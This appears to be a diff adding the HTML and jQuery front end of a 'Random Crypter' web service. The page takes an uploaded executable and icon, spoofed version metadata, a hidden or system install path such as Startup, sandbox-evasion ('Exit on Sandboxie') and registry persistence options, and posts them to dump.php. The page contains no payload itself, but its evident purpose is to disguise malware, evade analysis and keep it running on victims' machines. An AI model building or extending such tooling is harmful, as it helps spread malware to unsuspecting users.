@@ -1,0 +1,303 @@
+<!DOCTYPE html>
+<html>
+	<head>
+		<meta name="viewport" content="initial-scale=1, width=device-width, height=device-height, target-densitydpi=device-dpi"/>
+		<meta charset="utf-8">
+		<!-- Load scripts -->
+		<script src="formify/js/jquery-1.11.1.js"></script>
+		<script src="formify/js/jquery.maskedinput.js"></script>
+		<script src="formify/js/jquery.mousewheel.js"></script>
+		<script src="formify/js/perfect-scrollbar.js"></script>
+		<script src="formify/js/formify.min.js"></script>
+		<!-- Load styles & fonts -->
+		<link href="jquery-ui-1.11.4.custom/jquery-ui.css" rel="stylesheet">
+		
+		<style>
+			body{
+				font: 62.5% "Trebuchet MS", sans-serif;
+				margin: 50px;
+			}
+			.demoHeaders {
+				margin-top: 2em;
+			}
+			#dialog-link {
+				padding: .4em 1em .4em 20px;
+				text-decoration: none;
+				position: relative;
+			}
+			#dialog-link span.ui-icon {
+				margin: 0 5px 0 0;
+				position: absolute;
+				left: .2em;
+				top: 50%;
+				margin-top: -8px;
+			}
+			#icons {
+				margin: 0;
+				padding: 0;
+			}
+			#icons li {
+				margin: 2px;
+				position: relative;
+				padding: 4px 0;
+				cursor: pointer;
+				float: left;
+				list-style: none;
+			}
+			#icons span.ui-icon {
+				float: left;
+				margin: 0 4px;
+			}
+			.fakewindowcontain .ui-widget-overlay {
+				position: absolute;
+			}
+			select {
+				width: 200px;
+			}
+		</style>
+		<link rel="stylesheet" type="text/css" href="formify/styles/default/style.css"/>
+		<link rel="stylesheet" type="text/css" href="formify/styles/layout.css"/>
+		<link rel="stylesheet" type="text/css" href="formify/styles/perfect-scrollbar.css"/>
+		<link rel="stylesheet" type="text/css" href="formify/icons/css/font-awesome.css"/>
+		<link rel="stylesheet" type="text/css" href="assets/open_sans/stylesheet.css"/>
+		<!-- Load demo style -->
+		<link rel="stylesheet" type="text/css" href="style.css"/>
+		<style>
+			div.sett { cursor: pointer; }
+		</style>
+	</head>
+	
+	<body>
+		<div class="page-heading">
+			<h1>Random <strong>Crypter</strong></h1>
+			<h2>Submit this form ...</h2>
+		</div>
+		
+		<div id="globform" class="page formify">
+				<div class="row">
+					<div class="col col-12">
+						<h1>Register</h1>
+					</div>
+				</div>
+				
+				<div class="row border space-bottom-25 space-top-15">
+					<div class="col col-12">
+						<input placeholder="Input File" appearance="big" width="100%" style="width:100%;"/>
+					</div>
+					<div class="col col-12 space-top-10">
+						<input id="exeFile" type="file" style="width:100%" inputStyle="width:100%" />
+					</div>
+					<div class="col col-12">
+						<input placeholder="Input Icon" appearance="big" width="100%" style="width:100%;"/>
+					</div>
+					<div class="col col-12 space-top-10">
+						<input id="iconFile" type="file" style="width:100%" inputStyle="width:100%" />
+					</div>
+					<div class="col space-top-20">
+						<strong>
+							<input id="delay" label="Execution Delay " appearance="range" min="0" max="300"/>
+						</strong>
+					</div>
+				</div>
+				
+				<div class="row border space-bottom-25 space-top-15">
+					<div class="col col-12 sett">
+						<h3 onclick="$('.asmInfo').toggle();">Assembly Info ( fill'up if you want custom )</h3>
+					</div>
+					
+					<div class="asmInfo">
+						<div class="col col-6 space-bottom-10">
+							<input id="Title" label="Title" type="text"inputStyle="width:100%"/>
+						</div>
+						<div class="col col-6 space-bottom-10">
+							<input id="Description" label="Description" type="text"inputStyle="width:100%"/>
+						</div>
+						<div class="col col-6 space-bottom-10">
+							<input id="Company" label="Company" type="text"inputStyle="width:100%"/>
+						</div>
+						<div class="col col-6 space-bottom-10">
+							<input id="Product" label="Product" type="text"inputStyle="width:100%"/>
+						</div>
+						<div class="col col-6 space-bottom-10">
+							<input id="Copyright" label="Copyright" type="text"inputStyle="width:100%"/>
+						</div>
+						<div class="col col-6 space-bottom-10">
+							<input id="Guid" label="Guid" type="text"inputStyle="width:100%"/>
+						</div>
+						<div class="col col-6 space-bottom-10">
+							<input id="Version" label="Version => ( 1.0.0.0 )" type="text"inputStyle="width:100%"/>
+						</div>
+						<div class="col col-6 space-bottom-10">
+							<input id="FileVersion" label="FileVersion => ( 1.0.0.0 )" type="text"inputStyle="width:100%"/>
+						</div>
+					</div>
+				</div>
+				
+				<div class="row border space-bottom-25 space-top-15">
+					<div class="col col-12 sett">
+						<h3 onclick="$('.test').toggle();">Install Path ( fill'up if you want startup )</h3>
+					</div>
+					
+					<div class="col col-12 test">
+						<select id="zoneInstall" style="width:100%;" icon="fa fa-caret-down" iconPosition="right" inputStyle="width:100%">
+							<option selected disabled>Select Path</option>
+							<option>Program Files</option>
+							<option>Common Program Files</option>
+							<option>Windows Desktop</option>
+							<option>Favorites</option>
+							<option>Personnal ( My Documents )</option>
+							<option>Start Menu's Program</option>
+							<option>Recent</option>
+							<option>Send To</option>
+							<option>Start Menu</option>
+							<option>Startup</option>
+							<option>Windows</option>
+							<option>Windows System</option>
+							<option>Application Data</option>
+							<option>Local Application Data</option>
+							<option>Cookies</option>
+							<option>.NET Directory</option>
+						</select>
+					</div>
+					<div class="col col-7 space-top-10 test">
+						<input id="fileName" placeholder="Filename.exe" style="width:100%" inputstyle="width:100%;"/>
+					</div>
+					<div style="color:grey" class="col col-5 space-top-10 test">
+						<strong>ATTRIBUT_HIDDEN :</strong>
+						<input id="hidden" type="radio" /><br>
+						<strong>ATTRIBUT_SYSTEM<strong style="color:white;">_</strong>:</strong>
+						<input id="system" type="radio" />
+					</div>
+				</div>
+				
+				<div class="row border space-bottom-25">
+					<div class="col col-12 space-top-10">
+						<h3>Crypt Options</h3>
+						
+						<select id="userOpt" style="width:100%" inputStyle="width:100%" multiple>
+							<option>Exit on Sandboxie</option>
+							<!--<option>Persistant Process</option>-->
+							<option>Persistant Registry</option>
+						</select>
+					</div>
+				</div>
+				
+				<div class="row border space-bottom-15">
+					<div class="col col-12 space-top-15">
+						<div class="inputLabel" style="line-height:30px;">
+							I agree with the <a id ="popNext" href="#">Terms and Conditions</a>
+						</div>
+						<input id="checkTerm" type="checkbox" appearance="switch" style="float:right;margin-right:0;"/>
+					</div>
+				</div>
+				
+				<div class="row space-bottom-15 space-top-15">
+					<div class="col col-12">
+						<input id="givemeth" type="submit" value="Send" style="float:right;margin:0;"/>
+					</div>
+				</div>
+				
+				<div class="clear"></div>
+				
+				<div id="dialog" title="Dialog Title">
+					<p>DDLorem ipsum dolor sit amet, consectetur adipisicing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat.</p>
+				</div>
+		</div>
+	
+		<div class="page formify">
+			<div class="ui-widget">
+				<div class="ui-state-highlight ui-corner-all" style="margin-top: 20px; padding: 0 .7em;">
+					<p><span class="ui-icon ui-icon-info" style="float: left; margin-right: .3em;"></span>
+					<strong id="sucess" style="color:white;">Hey! download !</strong></p>
+				</div>
+			</div>
+			<br>
+			<div class="ui-widget">
+				<div class="ui-state-error ui-corner-all" style="padding: 0 .7em;">
+					<p><span class="ui-icon ui-icon-alert" style="float: left; margin-right: .3em;"></span>
+					<strong style="color:white">Alert: error</strong></p>
+				</div>
+			</div>
+		</div>
+		
+		<!-- formEnd -->
+		
+		<script> formify(); </script>
+		<script src="jquery-ui-1.11.4.custom/external/jquery/jquery.js"></script>
+		<script src="jquery-ui-1.11.4.custom/jquery-ui.js"></script>
+		<script>
+			$('.asmInfo').toggle();
+			$('.test').toggle();
+			
+			$("#givemeth").click(function()
+			{
+				function reqListener () 
+				{
+					try
+					{
+						var responseContent = JSON.parse(this.responseText);
+						alert("result => " + responseContent.result + "\r\ncode => " +  responseContent.set);
+					}
+					catch(e)
+					{
+						alert("parsing error = " + e);
+					}
+				}
+				
+				var exef = document.getElementById('exeFile').files[0];
+				var imgf = document.getElementById('iconFile').files[0];
+				
+				var formData = new FormData();
+				formData.append('file', exef);
+				formData.append('icon', imgf);
+				formData.append('zoneInstall', $("#zoneInstall").val());
+				formData.append('fileName', $("#fileName").val());
+				formData.append('hidden', $("#hidden").prop('checked') );
+				formData.append('system', $("#system").prop('checked') );
+				formData.append('userOpt', $("#userOpt").val());
+				formData.append('checkTerm', $("#checkTerm").prop('checked'));
+				
+				formData.append('Title', $("#Title").val());
+				formData.append('Description', $("#Description").val());
+				formData.append('Company', $("#Company").val());
+				formData.append('Product', $("#Product").val());
+				formData.append('Copyright', $("#Copyright").val());
+				formData.append('Guid', $("#Guid").val());
+				formData.append('Version', $("#Version").val());
+				formData.append('FileVersion', $("#FileVersion").val());
+				
+				formData.append('delay', $("#delay").val());
+				
+				var xhr = new XMLHttpRequest();
+				xhr.onload = reqListener;
+				xhr.open('POST', 'dump.php', true);
+				xhr.send(formData);
+			});
+
+			$( "#dialog" ).dialog({
+				autoOpen: false,
+				width: 400,
+				buttons: [
+					{
+						text: "Ok",
+						click: function() {
+							$( this ).dialog( "close" );
+						}
+					},
+					{
+						text: "Cancel",
+						click: function() {
+							$( this ).dialog( "close" );
+						}
+					}
+				]
+			});
+
+			// Link to open the dialog
+			$( "#popNext" ).click(function( event ) {
+				$( "#dialog" ).dialog( "open" );
+				event.preventDefault();
+			});
+		</script>
+	</body>
+</html>
